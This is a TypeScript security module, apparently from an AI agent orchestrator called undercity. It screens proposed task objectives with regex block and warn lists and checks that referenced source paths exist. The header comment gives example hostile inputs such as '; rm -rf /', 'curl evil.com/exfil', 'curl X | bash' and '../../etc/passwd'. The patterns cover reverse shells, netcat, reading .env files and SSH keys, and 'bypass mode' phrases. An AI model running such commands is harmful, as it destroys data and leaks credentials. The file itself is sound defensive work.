/**
 * Task Security Validation
 *
 * Validates task objectives before adding to the board.
 * Protects against malicious task injection via automated PM.
 *
 * | Pattern | Example | Action |
 * |---------|---------|--------|
 * | Shell injection | `; rm -rf /` | Block |
 * | Capability expansion | "enable bypass mode" | Block |
 * | Exfiltration | `curl evil.com/exfil` | Block |
 * | Malware/download | `curl X \| bash` | Block |
 * | Sensitive file access | Tasks targeting `.env` | Block |
 * | Path traversal | `../../etc/passwd` | Block |
 */

import { existsSync } from "node:fs";
import { dirname } from "node:path";
import { sessionLogger } from "./logger.js";
import { getPackageWarnings } from "./package-validator.js";

/**
 * Result of task security validation
 */
export interface TaskSecurityResult {
	/** Whether the task is safe to add */
	isSafe: boolean;
	/** Reasons for rejection (if not safe) */
	rejectionReasons: string[];
	/** Warnings (task is safe but suspicious) */
	warnings: string[];
	/** Sanitized objective (if minor fixes were applied) */
	sanitizedObjective?: string;
}

/**
 * Severity of security pattern match
 */
type SecuritySeverity = "block" | "warn";

/**
 * Security pattern definition
 */
interface SecurityPattern {
	/** Regex pattern to match */
	pattern: RegExp;
	/** What to do when matched */
	severity: SecuritySeverity;
	/** Human-readable description */
	description: string;
	/** Category for grouping */
	category: "shell" | "exfiltration" | "malware" | "sensitive_file" | "capability" | "path_traversal";
}

/**
 * Dangerous operation patterns that should block tasks
 */
const SECURITY_PATTERNS: SecurityPattern[] = [
	// ===== SHELL INJECTION =====
	{
		pattern: /;\s*rm\s+-rf?\s+[/~]/i,
		severity: "block",
		description: "Destructive rm command",
		category: "shell",
	},
	{
		pattern: /;\s*(?:rm|del|rmdir|rd)\s+/i,
		severity: "block",
		description: "Shell injection with delete",
		category: "shell",
	},
	{
		pattern: /&&\s*(?:rm|del|rmdir)\s+/i,
		severity: "block",
		description: "Chained delete command",
		category: "shell",
	},
	{
		pattern: /\|\s*(?:rm|del|sh|bash|zsh|cmd)\s*/i,
		severity: "block",
		description: "Pipe to shell/delete",
		category: "shell",
	},
	{
		pattern: /`[^`]*(?:rm|curl|wget|nc|netcat)[^`]*`/i,
		severity: "block",
		description: "Command substitution with dangerous command",
		category: "shell",
	},
	{
		pattern: /\$\([^)]*(?:rm|curl|wget|nc|netcat)[^)]*\)/i,
		severity: "block",
		description: "Command substitution with dangerous command",
		category: "shell",
	},
	{
		pattern: />\s*\/dev\/(?:sd|hd|nvme)/i,
		severity: "block",
		description: "Direct device write",
		category: "shell",
	},
	{
		pattern: /mkfs|fdisk|dd\s+if=/i,
		severity: "block",
		description: "Disk manipulation command",
		category: "shell",
	},
	{
		pattern: /chmod\s+777\s+\//i,
		severity: "block",
		description: "Insecure permission change on root",
		category: "shell",
	},
	{
		pattern: />\s*\/etc\//i,
		severity: "block",
		description: "Write to system config",
		category: "shell",
	},

	// ===== EXFILTRATION =====
	{
		pattern: /curl\s+[^|]*\|\s*(?:ba)?sh/i,
		severity: "block",
		description: "Curl pipe to shell (remote code execution)",
		category: "exfiltration",
	},
	{
		pattern: /wget\s+[^&]*&&\s*chmod\s+\+x/i,
		severity: "block",
		description: "Download and make executable",
		category: "exfiltration",
	},
	{
		pattern: /curl\s+.*--data.*(?:\.env|credentials|secret|password|token|key)/i,
		severity: "block",
		description: "Exfiltrate sensitive data via curl",
		category: "exfiltration",
	},
	{
		pattern: /(?:send|post|upload)\s+(?:the\s+)?(?:\.env|credentials|secrets?|passwords?|tokens?|keys?)\s+(?:to|at)/i,
		severity: "block",
		description: "Exfiltration instruction",
		category: "exfiltration",
	},
	{
		pattern: /nc\s+-[a-z]*\s+\d+\.\d+\.\d+\.\d+/i,
		severity: "block",
		description: "Netcat connection to IP",
		category: "exfiltration",
	},
	{
		pattern: /(?:reverse|back)\s*shell/i,
		severity: "block",
		description: "Reverse shell reference",
		category: "exfiltration",
	},

	// ===== MALWARE/DOWNLOAD =====
	{
		pattern: /download\s+(?:and\s+)?(?:run|execute|install)\s+/i,
		severity: "block",
		description: "Download and execute pattern",
		category: "malware",
	},
	{
		pattern: /(?:download|fetch|get)\s+.*\.(?:exe|sh|bat|ps1|msi|dmg|pkg)(?:\s|$)/i,
		severity: "block",
		description: "Download executable file",
		category: "malware",
	},
	{
		pattern: /pip\s+install\s+.*(?:git\+https?:|http:|ftp:)/i,
		severity: "block",
		description: "pip install from URL",
		category: "malware",
	},
	{
		pattern: /npm\s+install\s+.*(?:git\+https?:|http:|ftp:)/i,
		severity: "block",
		description: "npm install from URL",
		category: "malware",
	},
	{
		pattern: /install\s+.*(?:ransomware|malware|virus|trojan|keylogger|spyware)/i,
		severity: "block",
		description: "Malware installation reference",
		category: "malware",
	},
	{
		pattern: /crypto\s*(?:miner|mining)|mine\s+crypto/i,
		severity: "block",
		description: "Cryptocurrency mining reference",
		category: "malware",
	},

	// ===== SENSITIVE FILE ACCESS =====
	{
		pattern: /(?:read|cat|less|more|head|tail|view|open|access|get|dump)\s+(?:the\s+)?\.env(?:\s|$)/i,
		severity: "block",
		description: "Access .env file",
		category: "sensitive_file",
	},
	{
		pattern: /(?:read|cat|access|get|dump)\s+(?:the\s+)?(?:credentials?|secrets?)\.(?:json|yaml|yml|toml)/i,
		severity: "block",
		description: "Access credentials file",
		category: "sensitive_file",
	},
	{
		pattern: /(?:read|cat|access|get|dump)\s+(?:the\s+)?(?:\.ssh|id_rsa|id_ed25519|\.pem)/i,
		severity: "block",
		description: "Access SSH keys",
		category: "sensitive_file",
	},
	{
		pattern: /(?:read|cat|access|get|dump)\s+(?:the\s+)?(?:\.aws\/credentials|\.npmrc|\.pypirc)/i,
		severity: "block",
		description: "Access cloud/package credentials",
		category: "sensitive_file",
	},
	{
		pattern: /(?:log|print|output|display|echo)\s+(?:the\s+)?(?:api[_-]?key|secret[_-]?key|password|token)/i,
		severity: "block",
		description: "Log sensitive values",
		category: "sensitive_file",
	},
	{
		pattern: /(?:\/etc\/passwd|\/etc\/shadow|\/etc\/sudoers)/i,
		severity: "block",
		description: "System password file access",
		category: "sensitive_file",
	},

	// ===== CAPABILITY EXPANSION =====
	{
		pattern: /(?:enable|activate|turn\s+on)\s+(?:bypass|unsafe|unrestricted|admin)\s+mode/i,
		severity: "block",
		description: "Enable bypass mode",
		category: "capability",
	},
	{
		pattern: /disable\s+(?:verification|validation|security|safety)/i,
		severity: "block",
		description: "Disable security",
		category: "capability",
	},
	{
		pattern: /skip\s+(?:all\s+)?(?:verification|validation|security|checks)/i,
		severity: "block",
		description: "Skip verification",
		category: "capability",
	},
	{
		pattern: /(?:grant|give)\s+(?:(?:full|root|admin|sudo)\s*)+(?:access|permissions?)/i,
		severity: "block",
		description: "Escalate permissions",
		category: "capability",
	},
	{
		pattern: /run\s+(?:as|with)\s+(?:root|admin|sudo|elevated)/i,
		severity: "block",
		description: "Elevated execution",
		category: "capability",
	},

	// ===== PATH TRAVERSAL =====
	{
		pattern: /\.\.\/\.\.\/(?:etc|var|usr|root|home|tmp)/i,
		severity: "block",
		description: "Path traversal to system directories",
		category: "path_traversal",
	},
	{
		pattern: /\.\.\/\.\.\/\.\.\//i,
		severity: "block",
		description: "Deep path traversal",
		category: "path_traversal",
	},
	{
		pattern: /(?:^|\s)\/(?:etc|var|usr|root|proc|sys|dev)\//i,
		severity: "block",
		description: "Absolute path to system directory",
		category: "path_traversal",
	},

	// ===== WARNING PATTERNS (suspicious but not blocking) =====
	{
		pattern: /curl\s+https?:\/\//i,
		severity: "warn",
		description: "Curl command in task",
		category: "exfiltration",
	},
	{
		pattern: /wget\s+https?:\/\//i,
		severity: "warn",
		description: "Wget command in task",
		category: "exfiltration",
	},
	{
		pattern: /npm\s+install\s+(?:-g\s+)?[a-z]/i,
		severity: "warn",
		description: "npm install in task",
		category: "malware",
	},
	{
		pattern: /pip\s+install\s+[a-z]/i,
		severity: "warn",
		description: "pip install in task",
		category: "malware",
	},
	{
		pattern: /\.env\b/i,
		severity: "warn",
		description: "References .env file",
		category: "sensitive_file",
	},
	{
		pattern: /(?:password|secret|token|api[_-]?key)\s*=/i,
		severity: "warn",
		description: "Setting sensitive value",
		category: "sensitive_file",
	},
];

/**
 * Sensitive file patterns (for explicit file path checking)
 */
const SENSITIVE_FILE_PATTERNS: RegExp[] = [
	/\.env(?:\.|$)/i,
	/\.env\.(?:local|production|development|staging)/i,
	/credentials?\.(?:json|yaml|yml|toml|xml)/i,
	/secrets?\.(?:json|yaml|yml|toml|xml)/i,
	/\.pem$/i,
	/\.key$/i,
	/\.p12$/i,
	/\.pfx$/i,
	/private[_-]?key/i,
	/id_rsa/i,
	/id_ed25519/i,
	/id_ecdsa/i,
	/id_dsa/i,
	/\.aws\/credentials/i,
	/\.npmrc/i,
	/\.pypirc/i,
	/\.docker\/config\.json/i,
	/\.kube\/config/i,
	/\.ssh\/config/i,
	/\.netrc/i,
	/\.git-credentials/i,
	/\.pgpass/i,
	/\.my\.cnf/i,
];

/**
 * Patterns for sample/template files that are safe (not actual secrets)
 */
const SAFE_SAMPLE_PATTERNS: RegExp[] = [/\.example$/i, /\.sample$/i, /\.template$/i, /\.dist$/i, /\.default$/i];

/**
 * Check if a file path is sensitive
 */
export function isSensitiveFile(filePath: string): boolean {
	const normalizedPath = filePath.toLowerCase();

	// Check if it's a safe sample/template file first
	if (SAFE_SAMPLE_PATTERNS.some((pattern) => pattern.test(normalizedPath))) {
		return false;
	}

	return SENSITIVE_FILE_PATTERNS.some((pattern) => pattern.test(normalizedPath));
}

/**
 * Extract potential file paths from task objective
 *
 * Uses a split-based approach to avoid ReDoS vulnerabilities from
 * nested quantifiers in regex patterns.
 */
function extractFilePaths(objective: string): string[] {
	const paths: string[] = [];

	// Split by whitespace and check each token
	const tokens = objective.split(/\s+/);

	// Valid path character class (alphanumeric, dots, underscores, hyphens, slashes, tilde)
	const validPathChars = /^[.\w~/-]+$/;

	for (const token of tokens) {
		// Skip empty tokens
		if (!token) continue;

		// Check if token looks like a file path
		if (!validPathChars.test(token)) continue;

		// Relative path with extension: foo/bar.ts, ../foo.js
		if (/\.[a-zA-Z0-9]+$/.test(token) && token.includes("/")) {
			paths.push(token);
			continue;
		}

		// Absolute path starting with /
		if (token.startsWith("/") && token.length > 1) {
			paths.push(token);
			continue;
		}

		// Home path starting with ~/
		if (token.startsWith("~/") && token.length > 2) {
			paths.push(token);
			continue;
		}

		// Standalone file with extension: file.txt, .env
		if (/\.[a-zA-Z0-9]+$/.test(token) || token.startsWith(".")) {
			paths.push(token);
		}
	}

	return paths;
}

/**
 * Validate a task objective for security issues
 *
 * @param objective - Task objective to validate
 * @returns Validation result with safety status and details
 */
export function validateTaskObjective(objective: string): TaskSecurityResult {
	const result: TaskSecurityResult = {
		isSafe: true,
		rejectionReasons: [],
		warnings: [],
	};

	// Check against security patterns
	for (const { pattern, severity, description, category } of SECURITY_PATTERNS) {
		if (pattern.test(objective)) {
			if (severity === "block") {
				result.isSafe = false;
				result.rejectionReasons.push(`[${category}] ${description}`);
				sessionLogger.warn(
					{ objective: objective.substring(0, 100), pattern: description, category },
					"Task objective blocked by security pattern",
				);
			} else {
				result.warnings.push(`[${category}] ${description}`);
				sessionLogger.debug(
					{ objective: objective.substring(0, 100), pattern: description, category },
					"Task objective warning",
				);
			}
		}
	}

	// Check for sensitive file paths in the objective
	const filePaths = extractFilePaths(objective);
	for (const filePath of filePaths) {
		if (isSensitiveFile(filePath)) {
			result.isSafe = false;
			result.rejectionReasons.push(`[sensitive_file] Task references sensitive file: ${filePath}`);
			sessionLogger.warn(
				{ objective: objective.substring(0, 100), filePath },
				"Task objective references sensitive file",
			);
		}
	}

	// Check for suspicious package installations
	const packageWarnings = getPackageWarnings(objective);
	if (packageWarnings.length > 0) {
		result.warnings.push(...packageWarnings.map((w) => `[package] ${w}`));
		sessionLogger.debug(
			{ objective: objective.substring(0, 100), packageWarnings },
			"Task objective has package warnings",
		);
	}

	return result;
}

/**
 * Validate multiple task proposals
 *
 * @param proposals - Array of task proposals with objectives
 * @returns Array of validation results, one per proposal
 */
export function validateTaskProposals(proposals: Array<{ objective: string }>): Array<{
	objective: string;
	validation: TaskSecurityResult;
}> {
	return proposals.map((proposal) => ({
		objective: proposal.objective,
		validation: validateTaskObjective(proposal.objective),
	}));
}

/**
 * Filter out unsafe proposals, returning only safe ones
 *
 * @param proposals - Array of task proposals
 * @returns Filtered array containing only safe proposals
 */
export function filterSafeProposals<T extends { objective: string }>(proposals: T[]): T[] {
	return proposals.filter((proposal) => {
		const validation = validateTaskObjective(proposal.objective);
		if (!validation.isSafe) {
			sessionLogger.info(
				{ objective: proposal.objective.substring(0, 100), reasons: validation.rejectionReasons },
				"Filtered unsafe proposal",
			);
		}
		return validation.isSafe;
	});
}

/**
 * Quick check if a task objective is safe (no blocking patterns)
 *
 * @param objective - Task objective to check
 * @returns true if objective has no blocking security patterns
 */
export function isTaskObjectiveSafe(objective: string): boolean {
	return validateTaskObjective(objective).isSafe;
}

/**
 * Result of path validation
 */
export interface PathValidationResult {
	/** Whether all paths are valid */
	isValid: boolean;
	/** Directories that don't exist */
	invalidDirectories: string[];
	/** Files that reference non-existent directories */
	invalidFiles: string[];
}

/**
 * Known valid directories in the undercity codebase
 */
const VALID_SRC_DIRS = new Set([
	"src",
	"src/__tests__",
	"src/__tests__/utils",
	"src/__tests__/integration",
	"src/__tests__/orchestrator",
	"src/commands",
	"src/grind",
	"src/orchestrator",
	"src/worker",
	"src/rag",
]);

/**
 * Directories that definitely don't exist and indicate wrong project
 */
const INVALID_SRC_DIRS = new Set([
	"src/types",
	"src/components",
	"src/services",
	"src/hooks",
	"src/utils",
	"src/learning",
	"src/algorithms",
	"src/interfaces",
	"src/scanners",
	"src/routes",
	"src/context",
	"core",
	"monitoring",
	"analytics",
	"tests", // undercity uses src/__tests__
]);

/**
 * Validate that paths referenced in a task objective exist in the codebase
 *
 * @param objective - Task objective to validate
 * @param cwd - Working directory (defaults to process.cwd())
 * @returns Validation result with invalid paths
 */
export function validateTaskPaths(objective: string, cwd = process.cwd()): PathValidationResult {
	const result: PathValidationResult = {
		isValid: true,
		invalidDirectories: [],
		invalidFiles: [],
	};

	// Known file extensions
	const FILE_EXTENSIONS = /\.(?:ts|tsx|js|jsx|json|md)$/;

	// Extract paths that look like src/something/file.ts (allows dots in filenames like worker.test.ts)
	const srcPathPattern = /\b(src\/[\w./-]+)\b/g;
	const matches = objective.matchAll(srcPathPattern);

	for (const match of matches) {
		const path = match[1];
		// It's a file if it ends with a known extension
		const isFile = FILE_EXTENSIONS.test(path);
		const dir = isFile ? dirname(path) : path;

		// Check against known invalid directories first (fast path)
		for (const invalidDir of INVALID_SRC_DIRS) {
			if (dir === invalidDir || dir.startsWith(`${invalidDir}/`)) {
				result.isValid = false;
				if (path.includes(".")) {
					result.invalidFiles.push(path);
				} else {
					result.invalidDirectories.push(dir);
				}
				break;
			}
		}

		// If not in known invalid, check if directory exists
		if (result.isValid || !result.invalidDirectories.includes(dir)) {
			if (!VALID_SRC_DIRS.has(dir) && !existsSync(`${cwd}/${dir}`)) {
				result.isValid = false;
				if (path.includes(".")) {
					result.invalidFiles.push(path);
				} else {
					result.invalidDirectories.push(dir);
				}
			}
		}
	}

	// Also check for other invalid patterns (include dots to capture full file paths)
	const otherInvalidPatterns = [
		/\b(core\/[\w./-]+)/g,
		/\b(monitoring\/[\w./-]+)/g,
		/\b(analytics\/[\w./-]+)/g,
		/\b(tests\/[\w./-]+)/g, // undercity uses src/__tests__, not tests/
	];

	for (const pattern of otherInvalidPatterns) {
		const otherMatches = objective.matchAll(pattern);
		for (const match of otherMatches) {
			const path = match[1];
			result.isValid = false;
			result.invalidDirectories.push(path);
		}
	}

	// Deduplicate
	result.invalidDirectories = [...new Set(result.invalidDirectories)];
	result.invalidFiles = [...new Set(result.invalidFiles)];

	if (!result.isValid) {
		sessionLogger.debug(
			{
				objective: objective.substring(0, 100),
				invalidDirectories: result.invalidDirectories,
				invalidFiles: result.invalidFiles,
			},
			"Task references invalid paths",
		);
	}

	return result;
}

/**
 * Get all security patterns (for testing/documentation)
 */
export function getSecurityPatterns(): Array<{
	category: string;
	severity: SecuritySeverity;
	description: string;
}> {
	return SECURITY_PATTERNS.map(({ category, severity, description }) => ({
		category,
		severity,
		description,
	}));
}
